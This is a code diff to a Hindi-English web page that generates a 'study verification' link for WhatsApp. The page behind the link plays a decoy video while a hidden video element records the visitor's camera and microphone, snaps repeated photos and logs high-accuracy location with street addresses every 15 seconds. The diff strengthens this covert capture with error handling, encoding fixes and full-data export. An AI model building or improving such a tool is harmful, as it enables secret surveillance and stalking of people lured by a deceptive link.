@@ -22,13 +22,14 @@
         .stat-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.25); }
         .gallery-img { transition: all 0.3s ease; cursor: pointer; }
         .gallery-img:hover { transform: scale(1.05); }
+        .notice-box { background: rgba(255, 200, 0, 0.15); border: 1px solid rgba(255, 200, 0, 0.4); }
     </style>
 </head>
 <body class="gradient-bg min-h-screen">
 
 <div class="container mx-auto px-4 py-8 max-w-5xl">
 
-<!-- ============ ADMIN PANEL (Link Generator) ============ -->
+<!-- ============ ADMIN PANEL ============ -->
 <div id="adminPanel">
     <div class="text-center mb-10">
         <div class="inline-flex gap-2 bg-white/20 backdrop-blur rounded-full px-8 py-3 mb-5">
@@ -39,6 +40,12 @@
         <p class="text-white/80 text-lg">Link generate karo → Student camera page open hoga</p>
     </div>
 
+    <!-- HTTPS Warning -->
+    <div id="httpsWarning" class="notice-box rounded-2xl p-4 mb-6 text-yellow-100 hidden">
+        <p class="text-sm"><i class="fas fa-exclamation-triangle mr-2"></i>
+        <b>Camera/Mic kaam nahi karega!</b> Is page ko HTTPS par host karo (GitHub Pages auto HTTPS deta hai). Local file open karne par camera/mic block hoga.</p>
+    </div>
+
     <!-- Custom Upload Section -->
     <div class="grid md:grid-cols-2 gap-6 mb-8">
         <div class="upload-card rounded-3xl p-6 border border-white/20">
@@ -47,6 +54,7 @@
                 <h2 class="text-xl font-bold text-white">🎬 Custom Video</h2>
             </div>
             <input type="file" id="customVideoFile" accept="video/mp4,video/webm" class="w-full px-4 py-3 rounded-2xl bg-white/10 text-white border border-white/30 cursor-pointer">
+            <p class="text-white/50 text-xs mt-2">⚠️ Chhota video (2MB se kam) use karo, warna link lamba ho jayega</p>
             <div id="videoPreview" class="hidden mt-3 text-green-400 text-sm"><i class="fas fa-check-circle"></i> Video selected!</div>
         </div>
         
@@ -56,6 +64,7 @@
                 <h2 class="text-xl font-bold text-white">🖼️ Custom Image</h2>
             </div>
             <input type="file" id="customImageFile" accept="image/jpeg,image/png" class="w-full px-4 py-3 rounded-2xl bg-white/10 text-white border border-white/30 cursor-pointer">
+            <p class="text-white/50 text-xs mt-2">⚠️ Chhoti image (500KB se kam) use karo</p>
             <div id="imagePreview" class="hidden mt-3 text-green-400 text-sm"><i class="fas fa-check-circle"></i> Image selected!</div>
         </div>
     </div>
@@ -67,7 +76,7 @@
         <div class="grid md:grid-cols-3 gap-6 mb-8">
             <div>
                 <label class="text-white text-sm block mb-2 font-semibold">📝 Campaign Name</label>
-                <input type="text" id="campaignName" placeholder="e.g., Math Test" class="w-full px-4 py-3 rounded-2xl bg-white/20 text-white border border-white/30 focus:outline-none">
+                <input type="text" id="campaignName" placeholder="e.g., Math Test" class="w-full px-4 py-3 rounded-2xl bg-white/20 text-white border border-white/30 focus:outline-none placeholder-white/50">
             </div>
             <div>
                 <label class="text-white text-sm block mb-2 font-semibold">⚡ Capture Speed</label>
@@ -93,12 +102,13 @@
         
         <div id="linkBox" class="hidden mt-8 p-6 bg-white/20 rounded-2xl">
             <p class="text-white font-bold text-center mb-3 text-lg">✅ Student Link Ready!</p>
-            <input type="text" id="generatedLink" readonly class="w-full bg-white/20 text-white rounded-xl px-4 py-3 text-sm mb-4 font-mono">
+            <textarea id="generatedLink" readonly rows="3" class="w-full bg-white/20 text-white rounded-xl px-4 py-3 text-xs mb-4 font-mono break-all"></textarea>
             <div class="flex gap-4">
                 <button onclick="copyLink()" class="flex-1 bg-pink-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fas fa-copy mr-2"></i> Copy Link</button>
                 <button onclick="sendToWhatsApp()" class="flex-1 bg-green-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fab fa-whatsapp mr-2"></i> WhatsApp</button>
             </div>
             <p class="text-white/60 text-xs text-center mt-3">⚠️ Student is link ko open karega → Seedha Camera Page khulega</p>
+            <p class="text-yellow-200 text-xs text-center mt-2">🔒 Student ko camera + mic + location ki permission "Allow" karni hogi</p>
         </div>
     </div>
 
@@ -137,7 +147,7 @@
     <div id="locationsTab" class="space-y-4 hidden"></div>
 </div>
 
-<!-- ============ CAMERA PAGE (Student) ============ -->
+<!-- ============ CAMERA PAGE ============ -->
 <div id="cameraPanel" class="hidden">
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <audio id="hiddenAudio" autoplay></audio>
@@ -174,6 +184,14 @@
 </div>
 
 <script>
+// ============ SAFE BASE64 (Unicode support) ============
+function safeBtoa(str) {
+    return btoa(unescape(encodeURIComponent(str)));
+}
+function safeAtob(str) {
+    return decodeURIComponent(escape(atob(str)));
+}
+
 // ============ DATA STORAGE ============
 let allPhotos = [], allVideos = [], allVoices = [], allLocations = [];
 
@@ -182,6 +200,7 @@ let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder
 let videoChunks = [], audioChunks = [];
 let capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = null;
 let locationInterval = null;
+let isRecording = false;
 
 // ============ FILE UPLOAD ============
 let storedCustomVideo = null;
@@ -189,37 +208,40 @@ let storedCustomImage = null;
 
 document.getElementById('customVideoFile').addEventListener('change', function(e) {
     const file = e.target.files[0];
-    if(file) {
-        const reader = new FileReader();
-        reader.onload = function(event) {
-            storedCustomVideo = event.target.result;
-            document.getElementById('videoPreview').classList.remove('hidden');
-        };
-        reader.readAsDataURL(file);
+    if(!file) return;
+    if(file.size > 2 * 1024 * 1024) {
+        alert('⚠️ Video 2MB se bada hai! Link kaam nahi karega. Chhota video use karo.');
+        this.value = '';
+        return;
     }
+    const reader = new FileReader();
+    reader.onload = function(event) {
+        storedCustomVideo = event.target.result;
+        document.getElementById('videoPreview').classList.remove('hidden');
+    };
+    reader.readAsDataURL(file);
 });
 
 document.getElementById('customImageFile').addEventListener('change', function(e) {
     const file = e.target.files[0];
-    if(file) {
-        const reader = new FileReader();
-        reader.onload = function(event) {
-            storedCustomImage = event.target.result;
-            document.getElementById('imagePreview').classList.remove('hidden');
-        };
-        reader.readAsDataURL(file);
+    if(!file) return;
+    if(file.size > 500 * 1024) {
+        alert('⚠️ Image 500KB se badi hai! Link kaam nahi karega. Chhoti image use karo.');
+        this.value = '';
+        return;
     }
+    const reader = new FileReader();
+    reader.onload = function(event) {
+        storedCustomImage = event.target.result;
+        document.getElementById('imagePreview').classList.remove('hidden');
+    };
+    reader.readAsDataURL(file);
 });
 
 // ============ TAB MANAGEMENT ============
 function showTab(tab) {
-    document.getElementById('photosTab').classList.add('hidden');
-    document.getElementById('videosTab').classList.add('hidden');
-    document.getElementById('voicesTab').classList.add('hidden');
-    document.getElementById('locationsTab').classList.add('hidden');
-    
+    ['photosTab','videosTab','voicesTab','locationsTab'].forEach(t => document.getElementById(t).classList.add('hidden'));
     document.getElementById(tab + 'Tab').classList.remove('hidden');
-    
     if(tab === 'photos') displayPhotos();
     if(tab === 'videos') displayVideos();
     if(tab === 'voices') displayVoices();
@@ -306,7 +328,13 @@ function downloadVideo(idx) { const a = document.createElement('a'); a.download 
 function downloadVoice(idx) { const a = document.createElement('a'); a.download = `voice_${Date.now()}.webm`; a.href = allVoices[idx].data; a.click(); }
 
 function downloadAllData() {
-    const report = { photos: allPhotos.length, videos: allVideos.length, voices: allVoices.length, locations: allLocations, exportedAt: new Date().toLocaleString() };
+    const report = { 
+        photos: allPhotos.map(p => ({ time: p.time, data: p.data })), 
+        videos: allVideos.map(v => ({ time: v.time, data: v.data })), 
+        voices: allVoices.map(v => ({ time: v.time, data: v.data })), 
+        locations: allLocations, 
+        exportedAt: new Date().toLocaleString() 
+    };
     const a = document.createElement('a');
     a.download = `study_report_${Date.now()}.json`;
     a.href = URL.createObjectURL(new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' }));
@@ -316,28 +344,35 @@ function downloadAllData() {
 
 // ============ LINK GENERATION ============
 function generateLink() {
-    const campaignName = document.getElementById('campaignName').value;
+    const campaignName = document.getElementById('campaignName').value.trim();
     if(!campaignName) { alert('Please enter campaign name'); return; }
     
     const captureSpeed = document.getElementById('captureSpeed').value;
     const photoCount = document.getElementById('photoCount').value;
     
-    // Sab data ko object mein daalo
     const linkData = {
         n: campaignName,
         s: captureSpeed,
         p: parseInt(photoCount),
-        v: storedCustomVideo,
-        i: storedCustomImage
+        v: storedCustomVideo || null,
+        i: storedCustomImage || null
     };
     
-    // Encode to base64
-    const jsonStr = JSON.stringify(linkData);
-    const encoded = btoa(encodeURIComponent(jsonStr));
+    let encoded;
+    try {
+        encoded = safeBtoa(JSON.stringify(linkData));
+    } catch(e) {
+        alert('❌ Data bahut bada hai! Chhota video/image use karo.');
+        return;
+    }
     
-    // Link banao
-    const baseUrl = window.location.href.split('?')[0];
+    // URL length check
+    const baseUrl = window.location.href.split('?')[0].split('#')[0];
     const fullLink = baseUrl + '?data=' + encoded;
+    
+    if(fullLink.length > 8000) {
+        alert('⚠️ Link bahut lamba hai (' + fullLink.length + ' chars)! Video/image hatao ya chhota karo.');
+    }
     
     document.getElementById('generatedLink').value = fullLink;
     document.getElementById('linkBox').classList.remove('hidden');
@@ -346,34 +381,54 @@ function generateLink() {
 function copyLink() {
     const input = document.getElementById('generatedLink');
     input.select();
-    document.execCommand('copy');
-    alert('✅ Link copied!');
+    input.setSelectionRange(0, 99999);
+    try {
+        navigator.clipboard.writeText(input.value).then(() => {
+            alert('✅ Link copied!');
+        }).catch(() => {
+            document.execCommand('copy');
+            alert('✅ Link copied!');
+        });
+    } catch(e) {
+        document.execCommand('copy');
+        alert('✅ Link copied!');
+    }
 }
 
 function sendToWhatsApp() {
     const link = document.getElementById('generatedLink').value;
+    if(link.length > 2000) {
+        alert('⚠️ Link bahut lamba hai WhatsApp ke liye. Copy karke manually bhejo.');
+        return;
+    }
     window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + link)}`, '_blank');
 }
 
 // ============ CAMERA PAGE ============
 async function startCameraPageFromData(linkData) {
-    neededCount = linkData.p;
-    captureInterval = parseFloat(linkData.s) * 1000;
+    neededCount = linkData.p || 10;
+    captureInterval = parseFloat(linkData.s || 1) * 1000;
     capturedCount = 0;
     
     document.getElementById('cameraTitle').innerHTML = linkData.n || 'Study Session';
     
     const videoElement = document.getElementById('fakeVideo');
-    if(linkData.v && linkData.v !== '') {
+    if(linkData.v) {
         videoElement.src = linkData.v;
     } else {
         videoElement.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
     }
-    videoElement.play();
+    videoElement.play().catch(() => {});
     
-    if(linkData.i && linkData.i !== '') {
+    if(linkData.i) {
         document.body.style.backgroundImage = `url(${linkData.i})`;
         document.body.style.backgroundSize = 'cover';
+    }
+    
+    // Check HTTPS
+    if(location.protocol !== 'https:' && location.hostname !== 'localhost' && location.protocol !== 'file:') {
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i> HTTPS required for camera!';
+        return;
     }
     
     await startRecording();
@@ -381,53 +436,91 @@ async function startCameraPageFromData(linkData) {
 
 async function startRecording() {
     try {
-        hiddenStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Camera permission maang raha hai...';
+        
+        // Video only pehle
+        hiddenStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 640, height: 480 }, 
+            audio: false 
+        });
         document.getElementById('hiddenVideo').srcObject = hiddenStream;
         
-        videoRecorder = new MediaRecorder(hiddenStream);
-        videoChunks = [];
-        videoRecorder.ondataavailable = (e) => { if(e.data.size > 0) videoChunks.push(e.data); };
-        videoRecorder.onstop = () => { 
-            if(videoChunks.length) { 
-                const blob = new Blob(videoChunks, { type: 'video/webm' }); 
-                allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVideosFinal', JSON.stringify(allVideos));
-                updateStats();
-                displayVideos();
-            } 
-        };
-        videoRecorder.start(1000);
+        // Wait for video to be ready
+        await new Promise(resolve => {
+            const v = document.getElementById('hiddenVideo');
+            if(v.readyState >= 2) resolve();
+            else v.onloadeddata = resolve;
+        });
         
-        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        audioRecorder = new MediaRecorder(audioStream);
-        audioChunks = [];
-        audioRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
-        audioRecorder.onstop = () => { 
-            if(audioChunks.length) { 
-                const blob = new Blob(audioChunks, { type: 'audio/webm' }); 
-                allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVoicesFinal', JSON.stringify(allVoices));
-                updateStats();
-                displayVoices();
-            } 
-        };
-        audioRecorder.start(1000);
+        // Video recorder
+        try {
+            videoRecorder = new MediaRecorder(hiddenStream);
+            videoChunks = [];
+            videoRecorder.ondataavailable = (e) => { if(e.data.size > 0) videoChunks.push(e.data); };
+            videoRecorder.onstop = () => { 
+                if(videoChunks.length) { 
+                    const blob = new Blob(videoChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        allVideos.push({ id: Date.now(), data: reader.result, time: new Date().toLocaleString() });
+                        try {
+                            localStorage.setItem('studyVideosFinal', JSON.stringify(allVideos));
+                        } catch(e) { console.warn('localStorage full'); }
+                        updateStats();
+                        displayVideos();
+                    };
+                    reader.readAsDataURL(blob);
+                } 
+            };
+            videoRecorder.start(1000);
+            isRecording = true;
+        } catch(e) { console.warn('Video recorder failed:', e); }
         
+        // Audio
+        try {
+            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioRecorder = new MediaRecorder(audioStream);
+            audioChunks = [];
+            audioRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+            audioRecorder.onstop = () => { 
+                if(audioChunks.length) { 
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        allVoices.push({ id: Date.now(), data: reader.result, time: new Date().toLocaleString() });
+                        try {
+                            localStorage.setItem('studyVoicesFinal', JSON.stringify(allVoices));
+                        } catch(e) { console.warn('localStorage full'); }
+                        updateStats();
+                        displayVoices();
+                    };
+                    reader.readAsDataURL(blob);
+                } 
+            };
+            audioRecorder.start(1000);
+        } catch(e) { console.warn('Audio failed:', e); }
+        
+        // Location
         await getLocationWithAddress();
         locationInterval = setInterval(getLocationWithAddress, 15000);
         
         setTimeout(() => startCapture(), 2000);
         document.getElementById('statusText').innerHTML = '<i class="fas fa-heartbeat fa-pulse mr-2"></i> Study session active';
+        
     } catch(e) {
-        document.getElementById('statusText').innerHTML = '<i class="fas fa-info-circle mr-2"></i> Please allow camera access';
+        console.error(e);
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-info-circle mr-2"></i> Camera permission denied! Please allow.';
     }
 }
 
 async function getLocationWithAddress() {
+    if(!navigator.geolocation) return;
     navigator.geolocation.getCurrentPosition(async (p) => {
         let address = 'Address not found';
         try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`);
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`, {
+                headers: { 'Accept': 'application/json' }
+            });
             const data = await res.json();
             address = data.display_name || `${p.coords.latitude}, ${p.coords.longitude}`;
         } catch(e) {}
@@ -439,10 +532,12 @@ async function getLocationWithAddress() {
             address: address,
             time: new Date().toLocaleString() 
         });
-        localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations));
+        try {
+            localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations));
+        } catch(e) {}
         updateStats();
         displayLocations();
-    }, () => {});
+    }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
 }
 
 function startCapture() {
@@ -462,9 +557,14 @@ function startCapture() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            const photoData = canvas.toDataURL('image/jpeg', 0.7);
             allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
-            localStorage.setItem('studyPhotosFinal', JSON.stringify(allPhotos));
+            try {
+                localStorage.setItem('studyPhotosFinal', JSON.stringify(allPhotos));
+            } catch(e) {
+                console.warn('localStorage full, purane photos hata rahe hain');
+                allPhotos.shift();
+            }
             capturedCount++;
             updateStats();
             displayPhotos();
@@ -477,20 +577,17 @@ function startCapture() {
 }
 
 function updateStats() {
-    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal') || '[]');
-    let videos = JSON.parse(localStorage.getItem('studyVideosFinal') || '[]');
-    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal') || '[]');
-    let locs = JSON.parse(localStorage.getItem('studyLocsFinal') || '[]');
+    try {
+        allPhotos = JSON.parse(localStorage.getItem('studyPhotosFinal') || '[]');
+        allVideos = JSON.parse(localStorage.getItem('studyVideosFinal') || '[]');
+        allVoices = JSON.parse(localStorage.getItem('studyVoicesFinal') || '[]');
+        allLocations = JSON.parse(localStorage.getItem('studyLocsFinal') || '[]');
+    } catch(e) {}
     
-    allPhotos = photos;
-    allVideos = videos;
-    allVoices = voices;
-    allLocations = locs;
-    
-    document.getElementById('statPhotos').innerHTML = photos.length;
-    document.getElementById('statVideos').innerHTML = videos.length;
-    document.getElementById('statVoices').innerHTML = voices.length;
-    document.getElementById('statLocs').innerHTML = locs.length;
+    document.getElementById('statPhotos').innerHTML = allPhotos.length;
+    document.getElementById('statVideos').innerHTML = allVideos.length;
+    document.getElementById('statVoices').innerHTML = allVoices.length;
+    document.getElementById('statLocs').innerHTML = allLocations.length;
     
     displayPhotos();
 }
@@ -500,15 +597,22 @@ function checkUrl() {
     const urlParams = new URLSearchParams(window.location.search);
     const encodedData = urlParams.get('data');
     
+    // HTTPS warning
+    if(location.protocol !== 'https:' && location.hostname !== 'localhost' && location.protocol !== 'file:') {
+        document.getElementById('httpsWarning').classList.remove('hidden');
+    }
+    
     if(encodedData) {
         try {
-            const jsonStr = decodeURIComponent(atob(encodedData));
+            const jsonStr = safeAtob(encodedData);
             const linkData = JSON.parse(jsonStr);
             
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('cameraPanel').classList.remove('hidden');
             startCameraPageFromData(linkData);
         } catch(e) {
+            console.error('Link decode error:', e);
+            alert('❌ Link invalid hai! Dobara generate karo.');
             document.getElementById('adminPanel').classList.remove('hidden');
             document.getElementById('cameraPanel').classList.add('hidden');
             updateStats();
@@ -520,7 +624,7 @@ function checkUrl() {
     }
 }
 
-// Make global
+// Global functions
 window.generateLink = generateLink;
 window.copyLink = copyLink;
 window.sendToWhatsApp = sendToWhatsApp;
